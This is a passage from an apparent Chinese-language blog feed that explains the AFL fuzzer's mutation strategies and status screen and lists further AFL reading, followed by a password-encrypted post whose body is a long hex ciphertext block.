(insert)，从头开始，将用户提供的tokens依次插入到原文件中</li><li>auto extras (over)，从头开始，将自动检测的tokens依次替换到原文件中</li></ul><p><code>tokens</code>：</p><p>在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。</p><p><code>havoc变异</code>：</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul></blockquote><h4 id="font-color-blue3bitmapfont"><a class="markdownIt-Anchor" href="#font-color-blue3bitmapfont"></a> <font color="blue"><code>3.Bitmap</code></font></h4><p><img src="/images/145-3.png" alt></p><h3 id="font-colornavy0x01-afl界面介绍font"><a class="markdownIt-Anchor" href="#font-colornavy0x01-afl界面介绍font"></a> <font color="navy"><code>0x01 AFL界面介绍</code></font></h3><p><img src="/images/145-2.png" alt></p><p><code>process timing</code></p><blockquote><p>展示了当前fuzzer的运行时间、最近一次发现新执行路径的时间、最近一次崩溃的时间、最近一次超时的时间。值得注意的是第2项，最近一次发现新路径的时间。如果由于目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的，所以如果从fuzzing开始一直没有发现新的执行路径，那么就要考虑是否有二进制或者命令行参数错误的问题了。</p></blockquote><p><code>overall results</code></p><blockquote><p>这里包括运行的总周期数、总路径数、崩溃次数、超时次数。其中，总周期数可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。一般来说，当其变为绿色时，代表可执行的内容已经很少了，继续fuzzing下去也不会有什么新的发现了。此时，我们便可以通过Ctrl-C，中止当前的fuzzing。</p></blockquote><p><code>cycle progress</code></p><blockquote><p>该部分展示了当前cycle的队列中fuzzer的距离、当前工作的测试用例的ID</p></blockquote><p><code>Map coverage</code></p><blockquote><p>该部分的第一行介绍了碰撞的分支元组，与bitmap成正比；数字的左半部分是当前的输入，右半部分是整个语料库的值。</p></blockquote><p><code>Stage progress</code></p><blockquote><p>这里包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度。执行速度可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing。</p></blockquote><h3 id="font-colornavy0x02-afl的相关计算font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-afl的相关计算font"></a> <font color="navy"><code>0x02 AFL的相关计算</code></font></h3><h4 id="font-color-blue1覆盖率计算font"><a class="markdownIt-Anchor" href="#font-color-blue1覆盖率计算font"></a> <font color="blue"><code>1.覆盖率计算</code></font></h4><h3 id="font-color-navy0x03-源码分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-源码分析font"></a> <font color="navy"><code>0x03 源码分析</code></font></h3><h3 id="font-color-navyafl-相关文章font"><a class="markdownIt-Anchor" href="#font-color-navyafl-相关文章font"></a> <font color="navy"><code>AFL 相关文章</code></font></h3><p><strong>安装使用</strong></p><ol><li>AFL入门<br><a href="https://www.cnblogs.com/0xHack/p/9414444.html" target="_blank" rel="noopener">https://www.cnblogs.com/0xHack/p/9414444.html</a></li><li>[原创][新手向] 使用AFL来fuzz upx<br><a href="https://bbs.pediy.com/thread-249179.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249179.htm</a></li><li>[翻译]使用AFL进行fuzz<br><a href="https://bbs.pediy.com/thread-250866.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-250866.htm</a></li><li>AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing<br><a href="https://paper.seebug.org/841/" target="_blank" rel="noopener">https://paper.seebug.org/841/</a></li><li>AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率<br><a href="https://paper.seebug.org/842/" target="_blank" rel="noopener">https://paper.seebug.org/842/</a></li><li>afl-fuzz技术初探<br><a href="https://www.cnblogs.com/WangAoBo/p/8280352.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/8280352.html</a></li><li>AFL使用指南<br><a href="http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/" target="_blank" rel="noopener">http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/</a></li><li>Fuzz Testing with afl-fuzz (American Fuzzy Lop)<br><a href="https://spin.atomicobject.com/2015/08/23/fuzz-testing-american-fuzzy-lop/" target="_blank" rel="noopener">https://spin.atomicobject.com/2015/08/23/fuzz-testing-american-fuzzy-lop/</a></li></ol><p><strong>白皮书及文档翻译</strong></p><ol><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（一）——使用初体验<br><a href="https://blog.csdn.net/youkawa/article/details/45696317" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/45696317</a></li><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（二）——详细使用说明（README.txt ）<br><a href="https://blog.csdn.net/youkawa/article/details/76405468" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/76405468</a></li><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（三）——技术白皮书（technical whitepaper）<br><a href="https://blog.csdn.net/youkawa/article/details/76615480" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/76615480</a></li><li>afl技术白皮书笔记(1)<br><a href="https://ljie.space/2018/01/22/afl%E6%8A%80%E6%9C%AF%E7%99%BD%E7%9A%AE%E4%B9%A6%E7%AC%94%E8%AE%B0-1/" target="_blank" rel="noopener">https://ljie.space/2018/01/22/afl技术白皮书笔记-1/</a></li><li>afl-fuzz技术白皮书<br><a href="https://blog.csdn.net/gengzhikui1992/article/details/50844857" target="_blank" rel="noopener">https://blog.csdn.net/gengzhikui1992/article/details/50844857</a></li></ol><p><strong>技术分析</strong></p><ol><li>★★ 漏洞挖掘技术之 AFL 项目分析<br><a href="https://bbs.pediy.com/thread-249912.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249912.htm</a></li><li>[原创]afl-fuzz源码情景分析，详细读码笔记，freemind版本和word版本<br><a href="https://bbs.pediy.com/thread-218671.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218671.htm</a></li><li>AFL技术实现分析<br><a href="https://blog.csdn.net/qq_32464719/article/details/80592902#comments" target="_blank" rel="noopener">https://blog.csdn.net/qq_32464719/article/details/80592902#comments</a></li><li>★★ AFL内部实现细节小记<br><a href="http://rk700.github.io/2017/12/28/afl-internals/" target="_blank" rel="noopener">http://rk700.github.io/2017/12/28/afl-internals/</a></li><li>★★ AFL文件变异一览<br><a href="http://rk700.github.io/2018/01/04/afl-mutations/" target="_blank" rel="noopener">http://rk700.github.io/2018/01/04/afl-mutations/</a></li><li>AFL改进小试<br><a href="http://rk700.github.io/2018/02/02/afl-enhancement/" target="_blank" rel="noopener">http://rk700.github.io/2018/02/02/afl-enhancement/</a></li><li>★★ AFL-fuzz工具分析<br><a href="https://blog.csdn.net/Chen_zju/article/details/80791268" target="_blank" rel="noopener">https://blog.csdn.net/Chen_zju/article/details/80791268</a></li><li>AFL源码分析笔记(一)<br><a href="https://xz.aliyun.com/t/4628" target="_blank" rel="noopener">https://xz.aliyun.com/t/4628</a></li><li>AFL源码分析1——afl-gcc.c源码分析<br><a href="https://ch4r1l3.github.io/2019/03/05/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901%E2%80%94%E2%80%94afl-gcc-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/05/AFL源码分析1——afl-gcc-c源码分析/</a></li><li>AFL源码分析2——afl-as.c源码分析<br><a href="https://ch4r1l3.github.io/2019/03/06/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%902%E2%80%94%E2%80%94afl-as-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/06/AFL源码分析2——afl-as-c源码分析/</a></li><li>AFL源码分析3——afl-as.h源码分析<br><a href="https://ch4r1l3.github.io/2019/03/08/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%903%E2%80%94%E2%80%94afl-as-h%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/08/AFL源码分析3——afl-as-h源码分析/</a></li><li>AFL源码分析4——afl-fuzz.c源码分析1<br><a href="https://ch4r1l3.github.io/2019/03/09/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%904%E2%80%94%E2%80%94afl-fuzz-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/09/AFL源码分析4——afl-fuzz-c源码分析1/</a></li><li>AFL源码分析5——afl-fuzz.c源码分析2<br><a href="https://ch4r1l3.github.io/2019/03/10/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%905%E2%80%94%E2%80%94afl-fuzz-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%902/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/10/AFL源码分析5——afl-fuzz-c源码分析2/</a></li><li>afl fuzzer 源代码阅读<br><a href="https://www.cnblogs.com/jg01/p/9772700.html" target="_blank" rel="noopener">https://www.cnblogs.com/jg01/p/9772700.html</a></li><li>AFL不同文件结构<br><a href="https://barro.github.io/2018/06/afl-fuzz-on-different-file-systems/" target="_blank" rel="noopener">https://barro.github.io/2018/06/afl-fuzz-on-different-file-systems/</a></li><li>Fuzzing workflows; a fuzz job from start to finish<br><a href="https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/" target="_blank" rel="noopener">https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/</a></li></ol><p><strong>AFL 项目</strong></p><ol><li>AFL最原始版本,源码地址<br><a href="https://github.com/google/AFL" target="_blank" rel="noopener">https://github.com/google/AFL</a></li><li>[翻译]AFL生态圈 (这篇文章有很多关于AFL的开源项目地址和简单介绍）<br><a href="https://bbs.pediy.com/thread-251051.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251051.htm</a></li><li>AFLplusplus(该工具做了一些集成)<br><a href="https://github.com/vanhauser-thc/AFLplusplus" target="_blank" rel="noopener">https://github.com/vanhauser-thc/AFLplusplus</a></li><li>[分享]关于 fuzz 的 一点总结<br><a href="https://bbs.pediy.com/thread-249986.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249986.htm</a></li></ol><p><a href="https://www.jianshu.com/p/cc7a486e5adb" target="_blank" rel="noopener">(译)afl-fuzz白皮书</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-afl的流程font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-afl的流程font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="AFL" scheme="https://muzibing.github.io/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>网路安全学习库</title>
    <link href="https://muzibing.github.io/2020/08/23/2020.08.23%EF%BC%88144%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/23/2020.08.23（144）/</id>
    <published>2020-08-22T16:00:00.000Z</published>
    <updated>2020-09-03T06:31:43.658Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="f9281401213e6af1adecd2b8c7ad5819827ef722971c61d66fed850e82623edb">73296bdc1d9436449b76f537ac3be567a340b89ca9bfd8c10a2ac9e0e7c28fedf782e8c950a335611adb474d46d775f122f5feac37c5b5a3f519b2d6858ceb483d64b523fbb422a366aa88e79cce2e4dca95695aaed84f73b4578a8aa51e1d8133f73fa479b5018b94661fe0ae632e40e7c400fc41fa5d1f49804441214694c77045e82854f5d96b34341b7337bf24de57d4c664efc34ea7fbe966c4bcb14d704a22a127dcce1631fe89f2102f1d5b11910ef1402550ef7f9aee6b83fd9898275487eb19a6d42f3dea75da0d969860bcebbf8e8d7f111a5f8eef993de5f4275f0ad65ba5ccffaea667e9a553ee7108cd7e2d407409cc348184d12c8e18e7ddc16ddb2a426ebf9dd4ed5f875e0bc8f3d96ac7e0077649f7bc9d34f7cb681030db33569ea3720f9aba37fd57daa83f7eafe013bfcae6fe682e0b4d30c877e7839adb22d9c689c48d3b58c18ab3940192b8836ea97a10e1c82872cf4a05a02c69a0b3e6cea372aebd637c4d7cdcdb0864c9a2113f1ea83c4d8ddad0fc35caea3ade0a1642a3af431ed58cf73b18ae904eb6dbb2165162bce71123aa328726fb629b794d9f917b409475e948577a4ce6c9fa63cf61ccf2ef1da1487b2c9ba98b5ca487a2c8eee227b98dd4f98fb5a2d773380ca68513e1842305eb71df0fb28a4cff4514ae1203ac85e112c80965aadffc84242dd4c1b5fa90cd6ea449717b7261e62b8492de8d7fb80b9b1ee7630d721f5f696b6b7a8ca29bc8161db5a59972927fa5836067ea20593b91ddde93ac5a377351fbe41730fce3481566470f551e638469d346a8b9b695ebfdf3f73d23c9e9a8e2044267f2ad1354169ef5f217649bea7319393c9dcda864978b6e2c43a6c9083156a85a70d57087269d51295d5bb9c14a722fdb8b5dc6899efaab2e42bf5f34df605fea8e17749f5ed5636c033aca29f46fc0c290c4f9c191067922ae260740d0880068b155983e8825c8c8e45a313e6e8e1557861bd3cddd6c283d4e0c42293199949739b8b9b438d1dcfc14501a4e98171639e6ee1e6a95f513b79459241f844e503e11108d9a40872f5742e8c91c5d424ce4e10948604392f2b0bb3be03ae7f0b6f782673db61e67d92d654fcce23da013302477a9ce64354906921c6972ef70c5076e7599ecfe9b059945b4df89b9c7486aed5e8b30e6bdf5c2429d0498eb81bc7835170238c9246e6f5341491e1b10f4c1bc008900b12fe7ceb46f3447b21aac8cd204eeb2b28895f54dc0c7c6d177674199293e0e429f9905228368ccfab21a3cde5dd5f90b94d0198573de359d2df5404bdc00d5f9dc8458496702d51b192c56eed9fe43667425d3213cadbf9dccd0c7d06326380ddd916a20e8f06bf351515c7a78127ffc5025a3336b2b51276ef869cdd4c45226af7096ba24124e0eb15bae7fac2cde1948c5063ac4638a82040c57276c1e3f80ec9b61006261b7fa68e7bbd21e1e0f28b716cc832cba230d54f2346feee5001ab155d45066278c29af803c3827b3cc1bedc747164bb35ab9a76463d0bafbad938fa1a05c0740a72a3b52ea583ebd46fe3e028443d63639127ea05565eabb336a557817b8926df4fab102c57f89697f88878de392ccd28ef2772526282e2808573581eb961829abed86d865a8584e5206373e01bdaa33bfc646c6559ffde1af616ba0f927ab45da5af78adaccc8a772ebc3765fc3405803e7c267bb1239b597131443e378b488acf85e906a6e89eda78885d549a670859f6db41f1ef42c937ff64f18d8951c16a3604931f6ffc64efb12970c9ab8c903e5558eea59d9c773da3e4dc651db4d7f347d61d2252a83920902a815d8a23a613c6d0d508b37ab9b673d4a8b78c80e83e70daff93f9f077a18014327946f30a8cd41cc6d4ec2dbcd7bde66c1da71eacb0155693e9865ad0b51a31144febdc793681337c1a2fb4a436cef47a1b02bfc7d7d806c7ac6868f205345da7e60f2086ab491703d41b2f9a9eece07bffcb1d5527768bb270b1e794793b38ab7fb9f14df3187b18042d65b07fb8b507d3171d9d00aceee7486eaee985c57f53d0a03418a9aa159219bb360ae021203887729e849934460dc1cbbd1581c88ee408452ebb710b8d92a23d08fbcb8e52a4bbb402a6dedaa301fa27286990b7e43bbb368cd9eba3b2d5a56d28e32d822ba369a6c1e85b0da93905c336a9c27445ac8b25d8dfa6a2e39210e7ba38aa851f4d1f07570890ccf7c642e6b9aed3dc9d5b6e35f4e5afa92549c1004a82415824b0f13ae4deef4dd3e734f352ae7d484217235c0e25052a18c07080c21f7a5a051e5a693eadafb944c7730bf17c85357f4f1b681d504b72206a40eb2c60900d5b01dc3a5e9be06f0ff8c26e406d35cef6e88cc11892084a3310ea92051de1b05df2bad491e368d84ee9d3cef97fd16a72cdc60f0531854d8543e0005259ccee88e07f5ece78e6995a9e442c76f0497e70eb5edfe9be186efdb7ee8f9a3b9c8a75fc11f58771a3bf3adb4b4b233ca9fc560c4e73a0a9be01d67de0f5b8d98f7e8c196f695d09f0d553e58cb7be598eda4e9caa3abc6e2a8b718ce6973e2b58d41bcd075330e40e3d7a254a386aaed3fba82f3100e12c7e78c451acc4897d6359db8ea1a5e8c914c79936e1e8630f9e99d35cecd44b747ea436c1ddd58c822717faa3ba056cda0decd53433579e570ce1d3eba29e5bd6526aa6eacdd3532261737f2aff47beb28dc90ad557a1d887ee67d41144d275de4d7eca350cf09a4518059249dc8037950e5c350f25a44007dfd71446362014797b18b5710ec439689e087577751ab919138d0b9d13368fae417458aeaa077224fa1cd49396d4fe8f36bc445e362befc2cadca5d25b389700c481f8e87dca18ae7f7816b50fa83bc2406d6d194ba12d12b8443d746a9dbde1e808a891ae4219f32753f9a37592d01bd3164c64f2bba9d74351fa5a97b0da589746a817df96ab0818e0c665564882476d6d26d753c7f7ebb6240401e317afb6812327c7ed2ecf9079b682eabbd24af75128a46b2f0be0f4f058589a21bad98525fcf980f16e27159d18bfe0a29ad5639cf90f827a4faaa8422fc764669d59a49e22865145f3978bd34567a53510f08493a12017636f6563584b9ca933a760e30f120e2bcbe5a0f27dfae0d6461b39cf28ef6ae323c1ce9b873d5ead372ff5f05dd793016380f9bcc22fb7e4aa4bf8dc3b268e5813ca2d00c4f2517a00945a0704200eef06d00931535b47ffdfe3c4d9116c3dc87ecf1a9f5c6dadf80d7253d309cd470b274b32acc519421a191ba5d6c551fd377610345fd3cb3c5466edb7e2475ca9482ff7f15fc875435c6ec23d362e424035647225e68cf6e97eee1fb84fda48ac58116448a6fd14ec0c757c1ebbe5b931927335146044faead73a591a3a07e3534f7b37179f49430609d1b147b10b5a3d0eb4d9a4b4038e2e5c50e058e4f40e8dc80c41ebe51d42a4aa87ba2dc9489279ce24d563b55e12518782fc3c551e8323d2b8fb8c7fe5e11c528c5182bb725c18f2b3799a0c93489150085bf5f7b02f3a71995282c2fab27d73708628f2c69340632e47bd9e7de7db386b9d135328096db600396344701d4dc295ecdcd27925f29e81e70bfcea40d450a360371d1aaa7f40c82d66539e101cb85bcdfb95a757ed2ce333b001f3f1c48795253d8446dc1fea60c6bd350f87096ef27ea76dc11f2a40567b7ba2d8733a570aa5c67e4530bd2b870ed85c61c96dbeefd35afcbebb5a451af74ab7490b093b1221d9f0fe86c241507f10d88ffe6d5bf96516c39cbd2c30b3cf8e9e518d20df8d8c7669375c25a6aa811190b7acaee1a7ec0bf0bc25396f4cfeeb85c40d2def6b9b9b2079182461a25f605d91507e919ed60f18efa9f34e07f0347291c0d132e5f1c61ed540171f1c91c47bf70ea29e618855ae7ad37ca481b132bd859109215adb1ecd546959aa47a6bce757021751b8f03fc81d662aa8e021f7b3c64d05c92303f4be64a95b4dfada0a0273b25ee194d1c8461afde28fc86615724b1a9dae0dbb8801f23808ebec5a6c3021ac9a626387b37779d160feda9ed8d48bea08696c91bcd8dbdbad19a7e1c3389f505bcb3f3ca0be013e368b4dad9c330940d33265177fa1bac3ed37851d4d34f76e90ef59c1db0741e2af6ec3222594b437793775da24121f3448e1e900debc51b04122dcc549b220ec1b0f922bfbbf361ca7e8f7660f909cb0804f85cedf4aa957d37295803bfe22f3658af8c98a80e235e13bdba3ac39e99c056454588d2e9ee7d281c89187d28a2ef0457ff5e4c0778cb28dbe18ce4478a6b0e8d4a6c6520bd837e0935ab957e9f20f3b5cb52b1d08f1cbab68e653d0073476ba63c6a4f7b1bcee26237d62397e6790ed53be5c4597a55a75d9903d6ad91f4ef3e5ab493dc21f17f19f12b98ae9952808197c820dc1c383c664b72bbf73eb3f0add3ff058b174d4b8a71c5bb53e92145d7e5a63672e824348cb383d437c26da074597c26b65bdaa738e50abcccfe7ea4c801d7f1e20852bfd8871b72465605fcc69de40d15e4f9d7f06445a77f922697262e2a9ff493278d611d703fa95acb05053896bb92e76c715a1a28bcda51d46ac2138066a9c6537f106d003732fa516b4979c5acb624f8bc6446b2c47e35eda9af8624154a6a72aa7bd0abc258e0987b3db36830599825cbaa64e708ff6adab44bcd76d1536b9b4c5d97ccc295e6ae4af75094d4e6d5f201963d03523cb3a3f4d51c989cbbfa746bc430ffe506fdf0b32d5682e6742a0ba1d3898128b47e82754385359f5a8ddf1001f71c0e8460248fe61ec58b16d20e3b5e1ab6c603543c5296c5fa39deab2abf58e697707f7d99c602d4eba0cd721b0846a3465d6e93afde5fa180f3af3da4634844ccaaad2b97ac35b5a7c10ac711de1921f7d0f13f8d79fc76c6ea7eff8a98eae5118b3f89af556cba8c685b2e974789710cdf38c4ccfbfdc0007aed69b155d659775276dc689c058a4cd166c959d68c97338aa821ca2e2466c0430bf93b82b686aa8007e53096f914a56525b1e2ea85d3a61efdf7571c8a7faa9283448ba7921ed220f9f12fb6adbc9d45c3fe54f74a80de2931794e1b35e63445f3a620c35fa93226b15e6137c009b55d3cc0ff9e8af56ef671625627cf0e4a83f45c507a8142a858dec4911aeeee259afee4ccf987bf5faba6531862645027d6051c32f2391611bdd7e224f4ad4d2610d19b11b66904f159fdd23ca8a5a6f1428a942f3d494a877d7cf7d0cf223eae69585f63c3760a46b45d380bdd0a6737834f16aeedbd494bd718ffd92deceb83680570f0ec89f91b49e58e2293d5e40706b12fcc09cad5a8866817644beee03f27f42e30b787f9ca15491e2c825ed470ba310904d779d183bdb4def357d7116be405483546ebff451f8a0bf9202ec1c0146e8e986341bf1501358ada2d1ecd0635f72fd3a7467944039041be1a03af349acb0408357e940ce1d1334e747dfa844af06ca5e53c2bfe5634fd4965210a992dd57583a3b538e84683591b93f83ebe0c52a41da0dba66538a4e95fcfdfbb00e466a45a54d38e7e258a24330ed1b435cd9a79ad5cff7e015856be7cc7df0b4dbcc8d662fa4e2785ac9ebd8da170c98f8ac0e91688490c64b0a6002c59441cc626d4db8b1db745e6e248cbf535a3a4afc9cb9ecc181b374692613dcf1eeb2cf3efb7561125d6e15a80d2f0a7b7aca17430971aa23d1fada708e0740ae463f15c35e794a35366dfd49c78379a4c9ee5a718dc8a030e480c7979929ff5641041ddcf948e909ffdfc28839aa1fdb2c3f4beedd4f2c9152bd67cc439d7fee10198edc7d9976a01760334cdcb83fb0c249e05fff0f8a687c660e70f3b33b570626287886b3f5f2bad2fe161461af55a9ad8e6c521dc4fb020d242f63567ff93ed7f73500e76d0bed89caf021444ea086c0e903d7e431b3317bb6662f091673940e6ff9006d4d7f5f62872e9597e2cedd94832b2580ca6c4ef5d05c71ced218cffb78b4768b97f63f490cc7b0624bb9cf4170ea3230874dffdbe25be44065e10d896a3f2b6be29971e0fd9a4eb4ee6a1575b267bb23f96599893194b3ef84770b8f9d2f3f7a10976ec27fd18cb4988ab2b619056217dceb6392dd3e55363ada8e32e3bfd233584d33e7ae55f7bdae964efb3e4e8364b0526f9946de92b80532ee44b5661d01a0073f3caf11ec73f87eb298d438ce633e333b362fb2b4783d5a211dd326985260fbddaf7bb46d8bc53aebbbd9a37adb33c3ecfa4247fb3e33d048094a228a6ecfb9467a82a57b92f2da2b1a1d1bbb9a84fbeab1d5f4267d9a0862c632d4939dcc3a4a766726b074d4e18d237f7044644b5c7ed5d4d60be58d6f82ee1cac27f431757ba2d3d64f46129a8c65cffef618858af9f8f64c3a1469d7e6a72cece357d6344084c00440cd7f50deb32ca8e50f3d69194dec810bdc81404fc32a500b4eff6098283f6781258423fc1edf393d0ba4f24c1336a7ac72993865871aab1a7380edd169de396486f5a5dbe3b2313e034b90916eb1dd90dfa1365edc06cbda61b3f183f8193a56dffe46e168e24591c89acf15ae5d5a54a66b4fb967949bf2efa83544e163e16317bd8d282ec360365f74a92c7a362c9d5c7e6d55373884c35eeac1e77d538e3917a1eb4004ff649136bb8a95a2af64d5fc4e70ba3665ff8f05f78d1d0e5d0d2c84fad81cf1cf4fc19cd93ffb4726c67d5355af6cb43cfffef6cbfaccffbcbd2121eeab933d3df03f95770c731d7c0ac07aa65c3bbc550731a8dc29fb0b2a525c4fe9ffc43d26db4bd730728c52091abdc73eee897f09be67e00676bf4d05b385462dee976be0930673711c47ec202a18897eba611804793189e43159bb4d332834f6f2c252137d919367fad6ba7cc803f0ca9b2fd1eb707f6323dcd28fdc3ab4e3fef79086d6d2b62bf29003fb11f0bd9918fdbb3ca410c2d1e6e5d5a2d54dadfad1c461e836471783ba33891d486def7da64ec42874db44b9f3b415b4ff03769ad609c57002b842fd535850d030f3881b56957f52f02c2d07a25f2b634bc057681b809e4b8695fd0ba9cae8c5d569f435a7a5d848e7db87f2b20c68ce0685ab5836260c9da17cb86796b489156cc0e3e0cc5cd5b10340d2aec50f0ac9d4be94da5f6531993556cd054a9b32d6a9017bee77660fe2ad3ad5391b4e0c49fa6b1bbeb05f50350ebd409f5c7d12c82ad15b96e923194723cfe927743d2e544f5b77fcca51118b773b335f097b6df210f216de702c074a39f468e800d4faadd1fa3b4a4a5bce0e2a9957f893b2efb3a64985ca78cec91d47a7000585570c48037f94414c8234109aa94d3e125ea381e05e03872eea5e11faf872bd5ef4c4935bc724fb38773682eac4ce80a9b1e073ef316d249c22b5a9db54cb8c7ae1bfc9740d3214a1407cdc79dec220565f180ae14a4e9a0568b0718b318c392b6e7c27db97f8b79b82895467cc8fe6c84ad589b51e7fa70d928e105566f0b2f5837ce60387ee41a53a7507852abace609f24b244bda0a33b3ff74c96263bd9d3c01f121b4ebce95adb21ceda881f2ea1480b8f3f6afd2b0470dbf614f7469e40a3dea93b6de9cf69400acabc5506a0e04c5e16eea774bff9ecde6b1bd14e177609b8ec83f72432bc478e746c5500aba92edfbde7d2ef307877fa6c7c430ea79df6eb45618b65c7508cb4bae7db57f459b651d785f276ddcfba4ce4a924d5c4dcf7e6c1b162c3209bf5ba070f242d1e807ea26ea6e8d8e29696efe9700a7d1af8a838f4c0c3907242c99e9ffe1bf5ec1c95bf43dad69d19d7ea546ad0950918544f7b7444618c65e1aa7b65efa5471dc990bc6f788630981092741169ec8c75ff0d4fb01acc25f04499099295beb2f0c09de8aa0a8cecc2c9782df60af1ea1c2ff9166415ec5d9c614057e2a66414cd8b301043d39221227dd2b96fe3a6c2b9a747043c764ef6cac19a8e0c71ff7e0ca0500dce6b9bf00129f52c4c8f923687375958e7e21630cf09cf21f68f2b88690997eac7ee7df731e95b4022b3ea9153bc9a9c7682e99e03e277f602fab15898b0eb00d90fe41da509037511bf075f5adeff4ecf8f4ec6258b1f9976e744755db2ab90d7976915d8771a97b51d1413c467311e8addcc9cb7a87d0cb27bfd20484df8e4adca099d62bc26bffad7f0879a722f047f580f8c6d3b933b7c78b3286ea505416de7a423465b5b6307a94c845bfc502f5a8f7c417d4c5a3889f4d9b63c94ab9925c8e50ceff17913c02c66345a91e9252bd81c3dd0b6deeca2fdc17a69c02a97dc5869a28af549c39ec71dcb10faad619f48f9b4b5e8498a5948fab7e4d5fa26a4735e963300549d903eb6ec26425239deee99c3c4915456d790a361514de2dac2c58929e3b586e733ae10c7bdd499393d003796861e73a356c1ff8ed8487ec57d5240d5d5811bf53181479c2cb84db5296a72e8a51f554a06803e9705c945da4dd5174be9b463c459b33eaf1dd10b5056677ea5764ce3aa55e5bb9f351c977d29a5789dac9197df358709e062885af7d10df0d2122d2665ef2308430aabbed8f8489de5f77399cb86bc81362212a7adb473762255672d6b253f48ca3a78d052b03c15a0720043d0b3627eb9d096310c3a404b5a17edc8beeef6a80a67f827656078b0a301a5a90038f3e934fb835953999776248729ea05814c02fe70fde9bfa71806a3f214fbd62ff076a9f1bc1eb7dfc25ea364c381be336a849b36488c9111c081b9e7c1c9c0cae7ba6ac50a3c777df9153e962df74a08e5b56f175da834bf992f1da14c5443c41a913bb9dfe3f5df9c0cabcd4b1f51b05f34a89bc6956bcaeab222f61368e145a33d246c60b86730071eab8c76718e91897b9c253568b706bf9d4bf1216121d994c84e071777d2f5c4363cdebfe093f86f4def0b763549e2126bcdba2b3d0c6a0af437ace0e8180315ec51dbbdff853e39bfa3ec4d1971ecad505950cbefb1cbf7c67d49e1715594f76eb6ea990e36564aac52e01a78a07ae8ed6ae5198fa80660b63ce747fa126a4ae00f8b3515ff7a63ae822221815e3c2da8e480657da644875feadb4e55c278768fe2576db33f9dd7b93c97d41c55fd9a4f54e24efa1805da672eed842a106c7535014f53e6348c7bd744d8149f9f7cd57d4a9c27e164f2fc8b74